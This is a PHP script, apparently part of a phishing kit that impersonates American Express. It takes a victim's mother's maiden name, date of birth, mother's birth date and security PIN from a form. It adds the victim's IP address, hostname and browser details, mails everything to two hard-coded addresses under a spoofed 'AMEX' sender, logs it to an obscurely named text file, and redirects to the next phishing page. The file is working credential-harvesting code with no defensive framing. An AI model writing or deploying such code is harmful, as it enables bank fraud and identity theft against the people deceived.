<?php 
$to = "goodgirl3900@aol.com,benjuli1327@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "==================  NEW Infor ".$ip."  ==================\n";
$message .= "Mothers Maiden Name : ".$_POST['mmm']."\n";
$message .= "DOB : ".$_POST['dob']."\n";
$message .= "Mother's Birth Date : ".$_POST['mdob']."\n";
$message .= "Security Pin : ".$_POST['spin']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$message .= "=============+Codewizard+===========\n";
$to = "goodgirl3900@aol.com,benjuli1327@gmail.com";
$subj = " AMEX DOB & PIN ||".$ip."\n";
$from = "From: AMEX  <codewizard@approject.com>";
$fp = fopen('XXXaxmexXXX00SREZUxxxsassssssilkklllllxSDSSSVSSS.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
Header ("Location: email2.php");
?>